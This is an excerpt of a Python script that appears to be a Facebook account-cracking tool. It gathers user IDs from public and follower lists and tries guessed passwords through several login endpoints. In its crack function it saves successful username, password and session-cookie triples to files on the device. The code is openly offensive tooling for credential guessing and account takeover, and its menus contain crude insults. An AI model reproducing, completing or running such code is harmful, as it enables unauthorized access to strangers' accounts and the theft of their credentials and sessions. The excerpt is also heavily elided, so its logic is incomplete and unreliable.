...
def rekar():
  ...
  id = '-'.join(uuid)
  print('\033[37;1mYOUR ID : '+id)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/Hama2022/name/main/id.txt').text
    if id in httpCaht:
      ...
      print('\033[1;91mIDET ACTIVE NIA LA TELEGRAM NAMA BNERA @Rekar_Surchi...!')
      os.system('xdg-open https://t.me/Rek19')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
try:
        ...
        cetak(nel('\t• Please Wait For Install Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Please Wait For Install Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Please Wait For Install Requests •'))
...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mRekar_Surchi')
...
def uaku():
	try:
		ua=open('id-active.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/RekarSurchi119/ID-ACTIVE/blob/main/id-active.txt').text
		ua=open('.id-active.txt','w')
...
def banner():
	print(f'''\t{asu}    	
			{m}•{k}•{h}•{sir} Author : Rekar_Surchi {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
#	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)))
	print('')
	print('\033[0;1m[ \033[31;1m1 \033[0;1m] \033[37;1mPUBLIC CLONE ')
	print('\033[0;1m[ \033[31;1m2 \033[0;1m] \033[37;1mFOLOWER CLONE ')
	print('\033[0;1m[ \033[31;1m3 \033[0;1m] \033[37;1mRESULT CRACK ')
	print('\033[0;1m[ \033[31;1m0 \033[0;1m] \033[1;91mLOGOUT ')
	print('\033[31;1m----------------------------------------------------')
	_____alvino__adijaya_____ = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOICE : ')
	if _____alvino__adijaya_____ in ['1']:
		...
		back()
def error():
	print(f'{k}>> Error 404 {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. RANDOM {h}OK{x} Anda ')
	print(f'>> 2. RANDOM {k}CP{x} Anda ')
	print('>> 3. MORE	')
	kz = input(f'\n>> Select : ')
	if kz in ['2']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('\n\033[0;1m[ \033[31;1m? \033[0;1m] MULTIPLE IDs : '))
	except ValueError:
		print('>> ONLY TYPE 1 TO 10 ')
		exit()
	if jum<1 or jum>100:
		print('>> ID DUMPS ')
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] ENTER ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print('\n\033[0;1m[ \033[31;1m+ \033[0;1m] TOTAL ID : '+str(len(id)))
		print('\033[31;1m----------------------------------------------------')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('\n\033[0;1m[ \033[31;1m1 \033[0;1m] OLD ACCOUNT ')
	print('\n\033[0;1m[ \033[31;1m2 \033[0;1m] NEW ACCOUNT ')
	print('\n\033[0;1m[ \033[31;1m3 \033[0;1m] CRACK RANDOM ')
	print('')
	print('\033[31;1m----------------------------------------------------')
	...
	if hu in ['1','01']:
		...
		exit()
	print('\n\033[0;1m[ \033[31;1m1 \033[0;1m] MOBILE ')
	print('\n\033[0;1m[ \033[31;1m2 \033[0;1m] MBASIC ')
	print('\n\033[0;1m[ \033[31;1m3 \033[0;1m] TOUCH ')
	print('')
	print('\033[31;1m----------------------------------------------------')
	hc = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] Y/T SHOW APPS : ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] Y/T ADD PASSWORD : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('\033[0;1m( \033[31;1m+ \033[0;1m) PASSWORD BNUSA : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'[✓] SAVED {h}OK{x} IN : {h}OK/%s {x}'%(okc))
	print(f'[✗] SAVED {k}CP{x} IN : {k}CP/%s {x}'%(cpc))
	print('\033[31;1m----------------------------------------------------')
...
#	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
	...
	print('')
	print('\n\033[0;1m[ \033[31;1m? \033[0;1m] Y/T YOU START CRACKING AGAIN')
	woi = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE : ')
	if woi in ['y','Y']:
		back()
	else:
		print('\n\033[0;1m[ \033[31;1m+ \033[0;1m] GOOD BYE ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[Cracking] {P} {b}{loop}{P}/{u}{len(id)}{P} -> {P}[ {H}{ok}{P} ] - {P}[ {k}{cp}{x} ] - [ {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} ]  "),
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(user+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
